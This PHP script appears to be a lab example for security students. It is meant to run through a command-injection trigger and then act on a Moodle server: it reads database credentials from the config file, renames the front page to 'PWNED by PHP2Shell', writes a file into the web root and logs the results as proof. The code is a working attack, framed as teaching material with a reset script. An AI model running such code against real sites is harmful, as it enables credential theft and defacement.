<?php
// Student example: rename the Moodle front page through the DB.
//
// Copy this file into the shared loot/ directory, then run it through the
// 14-byte shell trigger described in the lab guide:
//
//   cp labs/examples/homepage.php loot/homepage.php
//   printf 'php /loot/homepage.php\n' > loot/c
//   ... -c 'sh</loot/c'
//
// Reset with labs/examples/reset-homepage.php. This script only updates the
// front-page course (mdl_course id=1); it does not touch real student data.

$configFile = '/var/www/config/config.php';
$src = file_get_contents($configFile);
if ($src === false) {
    fwrite(STDERR, "cannot read {$configFile}\n");
    exit(1);
}

$cfg = [];
foreach (['dbhost', 'dbname', 'dbuser', 'dbpass'] as $key) {
    if (preg_match('/\$CFG->' . $key . '\s*=\s*\'([^\']*)\'/', $src, $m)) {
        $cfg[$key] = $m[1];
    }
}

try {
    $pdo = new PDO(
        "mysql:host={$cfg['dbhost']};dbname={$cfg['dbname']};charset=utf8mb4",
        $cfg['dbuser'],
        $cfg['dbpass'],
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );

    $before = $pdo->query('SELECT fullname FROM mdl_course WHERE id = 1')->fetchColumn();
    if ($before === false) {
        throw new RuntimeException('front-page course id=1 not found');
    }

    $pdo->exec("UPDATE mdl_course SET fullname = 'PWNED by PHP2Shell', shortname = 'PWNED' WHERE id = 1");
    $row = $pdo->query('SELECT fullname, shortname FROM mdl_course WHERE id = 1')->fetch(PDO::FETCH_ASSOC);

    if (!$row || $row['fullname'] !== 'PWNED by PHP2Shell' || $row['shortname'] !== 'PWNED') {
        throw new RuntimeException('database read-back did not match the requested rename');
    }

    // A second, independent observation: the web-server account can write a
    // file in the web root. Reset removes this file and verifies it is gone.
    file_put_contents('/var/www/html/impact.txt', "front page renamed by www-data\n");
    if (!file_exists('/var/www/html/impact.txt')) {
        throw new RuntimeException('impact.txt was not created');
    }

    $evidence = "impact=ok before={$before} after={$row['fullname']} db=verified file=present\n";
    file_put_contents('/loot/p1', $evidence);
    echo $evidence;
} catch (Throwable $e) {
    fwrite(STDERR, 'homepage=failed reason=' . preg_replace('/\s+/', ' ', $e->getMessage()) . "\n");
    exit(1);
}
